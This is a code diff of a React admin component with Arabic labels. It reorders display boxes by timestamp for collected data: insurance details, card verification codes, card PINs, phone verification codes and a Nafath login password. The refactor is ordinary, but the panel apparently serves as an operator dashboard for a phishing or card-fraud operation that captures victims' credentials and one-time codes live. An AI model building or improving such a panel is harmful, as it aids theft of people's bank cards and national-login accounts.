@@ -1777,20 +1777,29 @@ const renderNafadBox = () => {
       selectedRequest.raw.nafadPassword
     );
     
-    // Get timestamps for each data type
-    const basicTimestamp = getTimestamp(basicRaw);
-    const insuranceTimestamp = getTimestamp(insuranceRaw);
-    const paymentTimestamp = getTimestamp(selectedRequest?.raw);
-    const cardOtpTimestamp = getTimestamp(selectedRequest?.raw);
-    const pinTimestamp = getTimestamp(selectedRequest?.raw);
-    const phoneTimestamp = getTimestamp(selectedRequest?.raw);
-    const nafadTimestamp = getTimestamp(selectedRequest?.raw);
-
-    return (
-      <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
-        
-        {/* صندوق المعلومات الأساسية - يظهر فقط إذا كانت هناك بيانات */}
-        {hasBasicData && (
+    // Get timestamps for each data type from database (updatedAt)
+    const basicTimestamp = basicRaw?.updatedAt ? new Date(basicRaw.updatedAt).getTime() : 0;
+    const insuranceTimestamp = insuranceRaw?.updatedAt ? new Date(insuranceRaw.updatedAt).getTime() : 0;
+    const cardTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
+    const pinTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
+    const phoneTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
+    const nafadTimestamp = selectedRequest?.raw?.updatedAt ? new Date(selectedRequest.raw.updatedAt).getTime() : 0;
+    
+    // Build boxes array with timestamps for sorting
+    type BoxType = {
+      key: string;
+      timestamp: number;
+      component: React.ReactNode;
+    };
+    
+    const boxes: BoxType[] = [];
+    
+    // Add boxes only if they have data
+    if (hasBasicData) {
+      boxes.push({
+        key: 'basic',
+        timestamp: basicTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -1838,10 +1847,15 @@ const renderNafadBox = () => {
               )}
             </div>
           </div>
-        )}
-
-        {/* صندوق تفاصيل التأمين - يظهر فقط إذا كانت هناك بيانات */}
-        {hasInsuranceData && (
+        )
+      });
+    }
+    
+    if (hasInsuranceData) {
+      boxes.push({
+        key: 'insurance',
+        timestamp: insuranceTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -1902,10 +1916,15 @@ const renderNafadBox = () => {
               </button>
             </div>
           </div>
-        )}
-
-        {/* صندوق رمز التحقق من البطاقة - يظهر فقط إذا كانت هناك بيانات */}
-        {hasCardData && (
+        )
+      });
+    }
+    
+    if (hasCardData) {
+      boxes.push({
+        key: 'card',
+        timestamp: cardTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -1916,7 +1935,7 @@ const renderNafadBox = () => {
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={cardOtpTimestamp} />
+            <TimeCounter timestamp={cardTimestamp} />
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
             </div>
@@ -1940,10 +1959,15 @@ const renderNafadBox = () => {
               </button>
             </div>
           </div>
-        )}
-
-        {/* صندوق رمز PIN - يظهر فقط إذا كانت هناك بيانات */}
-        {hasPinData && (
+        )
+      });
+    }
+    
+    if (hasPinData) {
+      boxes.push({
+        key: 'pin',
+        timestamp: pinTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -1982,10 +2006,15 @@ const renderNafadBox = () => {
               </button>
             </div>
           </div>
-        )}
-
-        {/* صندوق تحقق الهاتف - يظهر فقط إذا كانت هناك بيانات */}
-        {hasPhoneData && (
+        )
+      });
+    }
+    
+    if (hasPhoneData) {
+      boxes.push({
+        key: 'phone',
+        timestamp: phoneTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -2031,10 +2060,15 @@ const renderNafadBox = () => {
               </button>
             </div>
           </div>
-        )}
-
-        {/* صندوق نفاذ - يظهر فقط إذا كانت هناك بيانات */}
-        {hasNafadData && (
+        )
+      });
+    }
+    
+    if (hasNafadData) {
+      boxes.push({
+        key: 'nafad',
+        timestamp: nafadTimestamp,
+        component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
@@ -2075,8 +2109,17 @@ const renderNafadBox = () => {
               </button>
             </div>
           </div>
-        )}
-
+        )
+      });
+    }
+    
+    // Sort boxes by timestamp (newest first)
+    boxes.sort((a, b) => b.timestamp - a.timestamp);
+    
+    // Render sorted boxes
+    return (
+      <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
+        {boxes.map(box => box.component)}
       </div>
     );
   };
